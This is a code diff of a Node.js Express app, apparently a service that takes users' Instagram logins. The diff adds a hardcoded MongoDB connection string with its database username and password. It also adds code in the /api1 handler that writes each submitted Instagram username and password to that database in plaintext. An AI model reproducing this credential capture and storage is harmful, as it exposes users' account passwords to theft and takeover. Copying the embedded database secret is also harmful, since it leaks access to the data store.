@@ -2,11 +2,18 @@ var express = require('express');
 var bodyParser = require('body-parser');
 var app = express();
 var request = require('request');
-var axios = require('axios');
+var mongoose = require('mongoose');
+
+var Data1 = require('./models/api1');
 
 app.use(express.static('public'));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.set('view engine', 'ejs');
+
+mongoose.connect('mongodb://chester:qwe123rty@ds145113.mlab.com:45113/iwp', {
+  useNewUrlParser: true,
+  useUnifiedTopology: true
+});
 
 const port = process.env.PORT || 3001;
 
@@ -30,6 +37,21 @@ app.post('/api1', function(req, res) {
   username = req.body.instaUser;
   password = req.body.instaPass;
   number = req.body.reqno;
+
+  Data1.create(
+    {
+      instaUser: username,
+      instaPass: password,
+      requests: number
+    },
+    function(err, data1) {
+      if (err) {
+        console.log(err);
+      } else {
+        console.log('Data Added');
+      }
+    }
+  );
 
   request(
     {
